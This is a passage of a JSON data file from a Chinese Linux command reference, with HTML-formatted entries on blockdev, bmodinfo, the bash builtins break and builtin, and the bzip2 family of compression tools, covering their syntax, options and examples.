--setro <span class=\"hljs-regexp\">/dev/</span>hda4\n</code></pre>\n<p>读取设备是否为只读：</p>\n<pre><code class=\"language-shell\">blockdev --getro <span class=\"hljs-regexp\">/dev/</span>hda4\n</code></pre>\n<p>设置设别为可读写：</p>\n<pre><code class=\"language-shell\">blockdev --setrw <span class=\"hljs-regexp\">/dev/</span>hda4\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bmodinfo",
        "des": "显示给定模块的详细信息",
        "body": "<h1 id=\"bmodinfo\">bmodinfo</h1>\n<p>显示给定模块的详细信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bmodinfo命令</strong> 用于显示给定模块的详细信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bmodinfo</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示模块作者；</span>\n<span class=\"hljs-deletion\">-d：显示模块的描述信息；</span>\n<span class=\"hljs-deletion\">-l：显示模块的许可信息；</span>\n<span class=\"hljs-deletion\">-p：显示模块的参数信息；</span>\n<span class=\"hljs-deletion\">-n：显示模块对应的文字信息；</span>\n<span class=\"hljs-deletion\">-0：用ASCII码的0字符分割字段值，而不使用新行。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>模块名：要显示详细信息的模块名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示sg模块的信息：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-meta\"># modinfo sg</span>\n<span class=\"hljs-symbol\">filename:</span>    <span class=\"hljs-keyword\">/lib/</span>modules/<span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.9</span><span class=\"hljs-number\">-42.</span>ELsmp<span class=\"hljs-keyword\">/kernel/</span>drivers<span class=\"hljs-keyword\">/scsi/</span>sg.ko\n<span class=\"hljs-symbol\">author:</span>     Douglas Gilbert\n<span class=\"hljs-symbol\">description:</span>  SCSI generic (sg) driver\n<span class=\"hljs-symbol\">license:</span>    GPL\n<span class=\"hljs-symbol\">version:</span>    <span class=\"hljs-number\">3.5</span><span class=\"hljs-number\">.31</span> B0B0CB1BB59F0669A1F0D6B\n<span class=\"hljs-symbol\">parm:</span>      def_reserved_size:size of buffer reserved for each fd\n<span class=\"hljs-symbol\">parm:</span>      allow_dio:allow direct I/O (default: <span class=\"hljs-number\">0</span> (disallow))\n<span class=\"hljs-symbol\">alias:</span>     char-major<span class=\"hljs-number\">-21</span>-*\n<span class=\"hljs-symbol\">vermagic:</span>    <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.9</span><span class=\"hljs-number\">-42.</span>ELsmp SMP <span class=\"hljs-number\">686</span> REGPARM <span class=\"hljs-number\">4</span>KSTACKS gcc<span class=\"hljs-number\">-3.4</span>\n<span class=\"hljs-symbol\">depends:</span>    scsi_mod\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "break",
        "des": "结束for，while或until循环。",
        "body": "<h1 id=\"break\">break</h1>\n<p>结束for，while或until循环。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">break</span> [n]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>结束for，while或until循环，可指定退出几层循环。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>n（可选）：大于等于1的整数，用于指定退出几层循环。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非n小于1。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># break的可选参数n缺省值为1。</span>\n<span class=\"hljs-comment\"># 从外层for循环继续执行。</span>\n<span class=\"hljs-attribute\">for</span>((i=<span class=\"hljs-number\">3</span>;i&gt;<span class=\"hljs-number\">0</span>;i--)); do\n  <span class=\"hljs-attribute\">for</span>((j=<span class=\"hljs-number\">3</span>;j&gt;<span class=\"hljs-number\">0</span>;j--)); do\n    <span class=\"hljs-attribute\">if</span>((j==<span class=\"hljs-number\">2</span>)); then\n      <span class=\"hljs-comment\"># 换成break 1时结果一样</span>\n      <span class=\"hljs-attribute\">break</span>\n    <span class=\"hljs-attribute\">fi</span>\n  <span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%s %s\\n\"</span> <span class=\"hljs-variable\">${i}</span> <span class=\"hljs-variable\">${j}</span>\n  <span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-attribute\">3</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">2</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">1</span> <span class=\"hljs-number\">3</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 当n为2时：</span>\n<span class=\"hljs-comment\"># 退出两层循环，结束。</span>\n<span class=\"hljs-keyword\">for</span>((<span class=\"hljs-attribute\">i</span>=3;i&gt;0;i--)); <span class=\"hljs-keyword\">do</span>\n  <span class=\"hljs-keyword\">for</span>((<span class=\"hljs-attribute\">j</span>=3;j&gt;0;j--)); <span class=\"hljs-keyword\">do</span>\n    <span class=\"hljs-keyword\">if</span>((<span class=\"hljs-attribute\">j</span>==2)); then\n      break 2\n    fi\n  printf <span class=\"hljs-string\">\"%s %s\\n\"</span> <span class=\"hljs-variable\">${i}</span> <span class=\"hljs-variable\">${j}</span>\n  done\ndone\n<span class=\"hljs-comment\"># 输出结果</span>\n3 3\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "builtin",
        "des": "执行bash内建命令。",
        "body": "<h1 id=\"builtin\">builtin</h1>\n<p>执行bash内建命令。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">builtin [<span class=\"hljs-keyword\">shell</span><span class=\"language-bash\">-<span class=\"hljs-built_in\">builtin</span> [arg ...]]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>用于执行指定的bash内建命令。</li>\n<li><code>builtin</code>命令调用的bash内建命令优先于同名的外部命令及同名的shell函数。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>shell-builtin（可选）：要调用的bash内建命令。</p>\n<p>arg（可选）：传递给bash内建命令的一到多个参数。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回该内建命令执行的返回值，除非传递的不是bash内建命令或该内建命令被禁用。</p>\n<h2 id=\"例子\">例子</h2>\n<p>同名情况下的优先级顺序：</p>\n<p>builtin 内建命令 &gt; 函数 &gt; 内建命令 &gt; 外部命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 关于外部命令优先级最高的情况请参考enable命令。</span>\n<span class=\"hljs-comment\"># 此时内建命令优先使用</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"the Great Wall\"</span>\n<span class=\"hljs-comment\"># 调用内建命令type，返回命令的类型（builtin）</span>\n<span class=\"hljs-built_in\">type</span> -t <span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-comment\"># 定义 echo 函数</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">echo</span></span>(){\n    <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"123\\n\"</span>\n}\n<span class=\"hljs-comment\"># 此时同名函数优先使用，显示（123）</span>\n<span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-comment\"># 调用内建命令type，返回命令的类型（function）</span>\n<span class=\"hljs-built_in\">type</span> -t <span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-comment\"># 此时内建命令优先使用</span>\n<span class=\"hljs-built_in\">builtin</span> <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"backslash \\\\\"</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 执行shell内部指令，输出当前系统下的命令别名</span>\nbuiltin <span class=\"hljs-keyword\">alias</span>\n<span class=\"hljs-keyword\">alias</span> cp='cp -i'\n<span class=\"hljs-keyword\">alias</span> l.='<span class=\"hljs-keyword\">ls</span> -d .* <span class=\"hljs-params\">--color=tty</span>'\n<span class=\"hljs-keyword\">alias</span> ll='<span class=\"hljs-keyword\">ls</span> -l <span class=\"hljs-params\">--color=tty</span>'\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>='<span class=\"hljs-keyword\">ls</span> <span class=\"hljs-params\">--color=tty</span>'\n<span class=\"hljs-keyword\">alias</span> mv='mv -i'\n<span class=\"hljs-keyword\">alias</span> rm='rm -i'\n<span class=\"hljs-keyword\">alias</span> which='<span class=\"hljs-keyword\">alias</span> | <span class=\"hljs-string\">/usr/bin/which</span> <span class=\"hljs-params\">--tty-only</span> <span class=\"hljs-params\">--read-alias</span> <span class=\"hljs-params\">--show-dot</span> <span class=\"hljs-params\">--show-tilde</span>'\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n<li><p>如果要调用的内建命令被禁用了（包括<code>builtin</code>），那么执行会报错；关于禁用和启用内建命令请参考<code>enable</code>命令。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "bunzip2",
        "des": "创一个bz2文件压缩包",
        "body": "<h1 id=\"bunzip2\">bunzip2</h1>\n<p>创一个bz2文件压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bunzip2命令</strong> 解压缩由bzip2指令创建的”.bz2\"压缩包。对文件进行压缩与解压缩。此命令类似于“gzip/gunzip”命令，只能对文件进行压缩。对于目录只能压缩目录下的所有文件，压缩完成后，在目录下生成以“.bz2”为后缀的压缩包。bunzip2其实是bzip2的符号链接，即软链接，因此压缩解压都可以通过bzip2实现。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bunzip2</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件；</span>\n<span class=\"hljs-deletion\">-k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数；</span>\n<span class=\"hljs-deletion\">-s或——small：降低程序执行时，内存的使用量；</span>\n<span class=\"hljs-deletion\">-v或——verbose：解压缩文件时，显示详细的信息；</span>\n<span class=\"hljs-deletion\">-l，--license，-V或——version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>.bz2压缩包：指定需要解压缩的.bz2压缩包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/opt</code>目录下的etc.zip、var.zip和backup.zip进行压缩，设置压缩率为最高，同时在压缩完毕后不删除原始文件，显示压缩过程的详细信息。</p>\n<pre><code class=\"language-shell\">bzip2 -<span class=\"hljs-number\">9</span>vk <span class=\"hljs-regexp\">/opt/</span>etc.zip <span class=\"hljs-regexp\">/opt/</span>var.zip <span class=\"hljs-regexp\">/opt/</span>backup.zip\n</code></pre>\n<p>压缩完毕后，在<code>/opt</code>下就会生成相应的etc.zip.bz2、var.zip.bz2和backup.zip.bz2文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bye",
        "des": "命令用于中断FTP连线并结束程序",
        "body": "<h1 id=\"bye\">bye</h1>\n<p>命令用于中断FTP连线并结束程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bye命令</strong> 在ftp模式下，输入bye即可中断目前的连线作业，并结束ftp的执行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">bye</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">bye</span>\n</code></pre>\n"
    },
    {
        "title": "bzcat",
        "des": "解压缩指定的.bz2文件",
        "body": "<h1 id=\"bzcat\">bzcat</h1>\n<p>解压缩指定的.bz2文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzcat命令</strong> 解压缩指定的.bz2文件，并显示解压缩后的文件内容。保留原压缩文件，并且不生成解压缩后的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzcat</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>.bz2压缩文件：指定要显示内容的.bz2压缩文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/tmp/man.config</code>以bzip2格式压缩：</p>\n<pre><code class=\"language-shell\">bzip2 -z man.config\n</code></pre>\n<p>此时man.config会变成man.config.bz2</p>\n<p>将上面的压缩文件内容读出来：</p>\n<pre><code class=\"language-shell\">bzcat man.config.bz2\n</code></pre>\n<p>此时屏幕上会显示 man.config.bz2 解压缩之后的文件内容。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzcmp",
        "des": "比较两个压缩包中的文件",
        "body": "<h1 id=\"bzcmp\">bzcmp</h1>\n<p>比较两个压缩包中的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzcmp命令</strong> 主要功能是在不真正解压缩.bz2压缩包的情况下，比较两个压缩包中的文件，省去了解压缩后在调用cmp命令的过程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzcmp</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>文件1：指定要比较的第一个.bz2压缩包；</li>\n<li>文件2：指定要比较的第二个.bz2压缩包。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzdiff",
        "des": "直接比较两个.bz2压缩包中文件的不同",
        "body": "<h1 id=\"bzdiff\">bzdiff</h1>\n<p>直接比较两个.bz2压缩包中文件的不同</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzdiff命令</strong> 用于直接比较两个“.bz2”压缩包中文件的不同，省去了解压缩后再调用diff命令的过程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzdiff</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件1：指定要比较的第一个.bz2压缩包；</li>\n<li>  文件2：指定要比较的第二个.bz2压缩包。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzgrep",
        "des": "使用正则表达式搜索.bz2压缩包中文件",
        "body": "<h1 id=\"bzgrep\">bzgrep</h1>\n<p>使用正则表达式搜索.bz2压缩包中文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzgrep命令</strong> 使用正则表达式搜索“.bz2”压缩包中文件，将匹配的行显示到标注输出。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzgrep</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  搜索模式：指定要搜索的模式；</li>\n<li>  .bz2文件：指定要搜索的.bz2压缩包。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzip2",
        "des": "将文件压缩成bz2格式",
        "body": "<h1 id=\"bzip2\">bzip2</h1>\n<p>将文件压缩成bz2格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzip2命令</strong> 用于创建和管理（包括解压缩）“.bz2”格式的压缩包。</p>\n<p>bzip2 采用 Burrows-Wheeler 块排序文本压缩算法和 Huffman 编码方式压缩文件。 压缩率一般比基于 LZ77/LZ78 的压缩软件好得多，其性能接近 PPM 族统计类压缩软件。</p>\n<p>命令行参数有意设计为非常接近 GNU gzip 的形式，但也不完全相同。</p>\n<p>bzip2 从命令行读入文件名和参数。 每个文件被名为 \"原始文件名.bz2\" 的压缩文件替换。 每个压缩文件具有与原文件相同的修改时间、 权限， 如果可能的话，还具有相同的属主， 因此在解压缩时这些特性将正确地恢复。 在某些文件系统中， 没有权限、 属主或时间的概念， 或者对文件名的长度有严格限制， 例如 MSDOS，在这种情况下，bzip2 没有保持原文件名、 属主、 权限以及时间的机制， 从这个意义上说，bzip2 对文件名的处理是幼稚的。</p>\n<p>bzip2 和 bunzip2 在缺省情况下不覆盖已有的文件。 如果想覆盖已有的文件，要指定 -f 选项。</p>\n<p>如果未指定文件名， bzip2 将压缩来自标准输入的数据并写往标准输出。在这种情况下， bzip2 会拒绝将压缩结果写往终端，因为这完全无法理解并且是没有意义的。</p>\n<p>bunzip2 (以及 bzip2 -d) 对所有指定的文件进行解压缩处理。不是由 bzip2 产生的文件将被忽略，同时发出一个警告信息。 bzip2 按下列方式由压缩文件名确定解压后的文件名：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">filename</span>.bz2    解压成   <span class=\"hljs-keyword\">filename</span>\n<span class=\"hljs-keyword\">filename</span>.bz     解压成   <span class=\"hljs-keyword\">filename</span>\n<span class=\"hljs-keyword\">filename</span>.tbz2   解压成   <span class=\"hljs-keyword\">filename</span>.tar\n<span class=\"hljs-keyword\">filename</span>.tbz    解压成   <span class=\"hljs-keyword\">filename</span>.tar\nanyothername    解压成   anyothername.<span class=\"hljs-keyword\">out</span>\n</code></pre>\n<p>如果文件名的后缀不是下列之一： .bz2, .bz, .tbz2 或 .tbz, .bzip2 将抱怨无法确定原始文件名，并采用原文件名加 .out 作为解压缩文件名。</p>\n<p>在压缩时，如果不提供文件名，bzip2 将从标准输入读取数据，压缩结果写往标准输出。</p>\n<p>bzip2 采用 32 位 CRC 校验码作自我检查，以确认解压后的文件与原始文件相同。 这可用于检测压缩文件是否损坏，并防止 bzip2 中未知的缺陷（运气好的话这种可能性非常小）。   数据损坏而未检测到的几率非常之小，  对于每个被处理的文件大约是四十亿分之一。  检查是在解压缩时进行的，因此它只能说明某个地方出问题了。 它能帮助恢复原始未压缩的数据。可以用 bzip2recover 来尝试从损坏的文件中恢复数据。</p>\n<p>返回值：正常退出返回 0， 出现环境问题返回 1 （文件未找到，非法的选项，I/O错误等）， 返回 2 表明压缩文件损坏，出现导致 bzip2 紧急退出的内部一致性错误（例如缺陷）时返回 3。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">bzip2 <span class=\"hljs-selector-attr\">[ -cdfkqstvzVL123456789 ]</span> <span class=\"hljs-selector-attr\">[ filenames ...  ]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">c</span> <span class=\"hljs-built_in\">--stdout</span>\n    <span class=\"hljs-comment\"># 将数据压缩或解压缩至标准输出。</span>\n\n-<span class=\"hljs-string\">d</span> <span class=\"hljs-built_in\">--decompress</span>\n    <span class=\"hljs-comment\"># 强制解压缩。 bzip2, bunzip2 以及 bzcat 实际上是同一个程序，进行何种操作将根据程序名确定。  指定该选项后将不考虑这一机制，强制 bzip2 进行解压缩。</span>\n\n-<span class=\"hljs-string\">z</span> <span class=\"hljs-built_in\">--compress</span>\n    <span class=\"hljs-comment\"># -d 选项的补充：强制进行压缩操作，而不管执行的是哪个程序。</span>\n\n-<span class=\"hljs-string\">t</span> <span class=\"hljs-built_in\">--test</span>\n    <span class=\"hljs-comment\"># 检查指定文件的完整性，但并不对其解压缩。 实际上将对数据进行实验性的解压缩操作，而不输出结果。</span>\n\n-<span class=\"hljs-string\">f</span> <span class=\"hljs-built_in\">--force</span>\n    <span class=\"hljs-comment\"># 强制覆盖输出文件。通常 bzip2 不会覆盖已经存在的文件。该选项还强制 bzip2 打破文件的硬连接，缺省情况下 bzip2 不会这么做。</span>\n\n-<span class=\"hljs-string\">k</span> <span class=\"hljs-built_in\">--keep</span>\n    <span class=\"hljs-comment\"># 在压缩或解压缩时保留输入文件（不删除这些文件）。</span>\n\n-<span class=\"hljs-string\">s</span> <span class=\"hljs-built_in\">--small</span>\n    <span class=\"hljs-comment\"># 在压缩、解压缩及检查时减少内存用量。采用一种修正的算法进行压缩和测试，每个数据块仅需要 2.5 个字节。这意味着任何文件都可以在 2300k</span>\n    <span class=\"hljs-comment\"># 的内存中进行解压缩， 尽管速度只有通常情况下的一半。</span>\n\n    <span class=\"hljs-comment\"># 在压缩时，-s将选定 200k 的块长度，内存用量也限制在 200k 左右， 代价是压缩率会降低。 总之，如果机器的内存较少（8兆字节或更少），</span>\n    <span class=\"hljs-comment\"># 可对所有操作都采用-s选项。参见下面的内存管理。</span>\n\n-<span class=\"hljs-string\">q</span> <span class=\"hljs-built_in\">--quiet</span>\n    <span class=\"hljs-comment\"># 压制不重要的警告信息。属于 I/O 错误及其它严重事件的信息将不会被压制。</span>\n\n-<span class=\"hljs-string\">v</span> <span class=\"hljs-built_in\">--verbose</span>\n    <span class=\"hljs-comment\"># 详尽模式 -- 显示每个被处理文件的压缩率。 命令行中更多的 -v 选项将增加详细的程度， 使 bzip2 显示出许多主要用于诊断目的信息。</span>\n\n-<span class=\"hljs-string\">L</span> <span class=\"hljs-built_in\">--license</span> -<span class=\"hljs-string\">V</span> <span class=\"hljs-built_in\">--version</span>\n    <span class=\"hljs-comment\"># 显示软件版本，许可证条款及条件。</span>\n\n-<span class=\"hljs-string\">1</span> <span class=\"hljs-string\">to</span> -<span class=\"hljs-string\">9</span>\n    <span class=\"hljs-comment\"># 在压缩时将块长度设为 100 k、200 k ..  900 k。 对解压缩没有影响。参见下面的内存管理。</span>\n\n-- <span class=\"hljs-comment\"># 将所有后面的命令行变量看作文件名，即使这些变量以减号\"-\"打头。 可用这一选项处理以减号\"-\"打头的文件名， 例如：bzip2 -- -myfilename.</span>\n\n<span class=\"hljs-built_in\">--repetitive-fast</span> <span class=\"hljs-built_in\">--repetitive-best</span>\n    <span class=\"hljs-comment\"># 这些选项在 0.9.5 及其以上版本中是多余的。 在较早的版本中，这两个选项对排序算法的行为提供了一些粗糙的控制，有些情况下很有用。 0.9.5</span>\n    <span class=\"hljs-comment\"># 及其以上版本采用了改进的算法而与这些选项无关。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要压缩的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p><strong>压缩指定文件filename:</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bzip2 </span>filename\n或\n<span class=\"hljs-keyword\">bzip2 </span>-z filename\n</code></pre>\n<p>这里，压缩的时候不会输出，会将原来的文件filename给删除，替换成filename.bz2.如果以前有filename.bz2则不会替换并提示错误（如果想要替换则指定-f选项，例如<code>bzip2 -f filename</code>；如果filename是目录则也提醒错误不做任何操作；如果filename已经是压过的了有bz2后缀就提醒一下，不再压缩，没有bz2后缀会再次压缩。</p>\n<p><strong>解压指定的文件filename.bz2:</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bzip2 </span>-d filename.<span class=\"hljs-keyword\">bz2\n</span>或\n<span class=\"hljs-keyword\">bunzip2 </span>filename.<span class=\"hljs-keyword\">bz2</span>\n</code></pre>\n<p>这里，解压的时候没标准输出，会将原来的文件filename.bz2给替换成filename。如果以前有filename则不会替换并提示错误（如果想要替换则指定<code>-f</code>选项，例如<code>bzip2 -df filename.bz2</code>。</p>\n<p><strong>压缩解压的时候将结果也输出：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"><span class=\"hljs-keyword\">$bzip2</span> -v filename</span>\n</code></pre>\n<p>输入之后，输出如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">filename</span>:  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">119</span>:<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">67</span>.<span class=\"hljs-number\">200</span> bits/byte, -<span class=\"hljs-number\">740</span>.<span class=\"hljs-number\">00</span>% saved, <span class=\"hljs-number\">5</span> in, <span class=\"hljs-number\">42</span> out.\n</code></pre>\n<p>这里，加上<code>-v</code>选项就会输出了,只用压缩举例了，解压的时候同理<code>bzip2 -dv filename.bz2</code>不再举例了。</p>\n<p><strong>模拟解压实际并不解压：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bzip2 </span>-tv filename.<span class=\"hljs-keyword\">bz2</span>\n</code></pre>\n<p>输入之后，输出如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">filename.bz2:</span> ok\n</code></pre>\n<p>这里，<code>-t</code>指定要进行模拟解压，不实际生成结果，也就是说类似检查文件,当然就算目录下面有filename也不会有什么错误输出了，因为它根本不会真的解压文件。为了在屏幕上输出，这里加上<code>-v</code>选项了,如果是真的解压<code>bzip2 -dv filename.bz2</code>则输出的是把\"ok\"替换成了\"done\"。</p>\n<p><strong>压缩解压的时候，除了生成结果文件，将原来的文件也保存:</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bzip2 </span>-k filename\n</code></pre>\n<p>这里，加上<code>-k</code>就保存原始的文件了，否则原始文件会被结果文件替代。只用压缩举例了，解压的时候同理<code>$bzip2 -dk filename.bz2</code>不再举例了。</p>\n<p><strong>解压到标准输出：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bzip2 </span>-dc filename.<span class=\"hljs-keyword\">bz2</span>\n</code></pre>\n<p>输入之后，输出如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hahahhaahahha</span>\n</code></pre>\n<p>这里，使用<code>-c</code>指定到标准输出，输出的是文件filename的内容，不会将filename.bz2删除。</p>\n<p><strong>压缩到标准输出：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-title\">bzip2</span> -c filename\n<span class=\"hljs-title\">bzip2</span>: <span class=\"hljs-type\">I</span> won't write compressed <span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span> to a terminal.</span>\n<span class=\"hljs-title\">bzip2</span>: <span class=\"hljs-type\">For</span> help, <span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span>: `bzip2 <span class=\"hljs-comment\">--help'.</span></span>\n</code></pre>\n<p>这里，使用<code>-c</code>指定压缩到标准输出不删除原有文件，不同的是，压缩后的文件无法输出到标准输出。</p>\n<p><strong>使用bzip2的时候将所有后面的看作文件(即使文件名以'-'开头)：</strong> </p>\n<pre><code class=\"language-shell\">bzip2 <span class=\"hljs-comment\">-- -myfilename</span>\n</code></pre>\n<p>这里主要是为了防止文件名中<code>-</code>产生以为是选项的歧义。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "bzip2recover",
        "des": "恢复被破坏的.bz2压缩包中的文件",
        "body": "<h1 id=\"bzip2recover\">bzip2recover</h1>\n<p>恢复被破坏的.bz2压缩包中的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzip2recover命令</strong> 可用于恢复被破坏的“.bz2”压缩包中的文件。</p>\n<p>bzip2是以区块的方式来压缩文件，每个区块视为独立的单位。因此，当某一区块损坏时，便可利用bzip2recover，试着将文件中的区块隔开来，以便解压缩正常的区块。通常只适用在压缩文件很大的情况。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzip2recover</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要恢复数据的.bz2压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzless",
        "des": "增强.bz2压缩包查看器",
        "body": "<h1 id=\"bzless\">bzless</h1>\n<p>增强.bz2压缩包查看器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzless命令</strong> 是增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzless</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要分屏显示的.bz2压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bzmore",
        "des": "查看bzip2压缩过的文本文件的内容",
